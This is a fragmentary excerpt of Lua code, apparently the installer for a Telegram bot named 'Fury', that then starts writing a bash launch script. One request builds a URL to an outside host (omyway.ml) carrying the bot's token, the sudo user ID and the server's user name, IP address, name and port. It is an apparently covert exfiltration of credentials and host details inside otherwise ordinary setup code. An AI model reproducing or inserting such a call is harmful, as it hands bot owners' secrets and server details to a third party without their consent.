...
data,res = https.request("https://omyway.ml/Fury/ali.php?bn=info&id="..Id)
if res == 200 then
...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://omyway.ml/Fury/ali.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("Fury", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/Fury
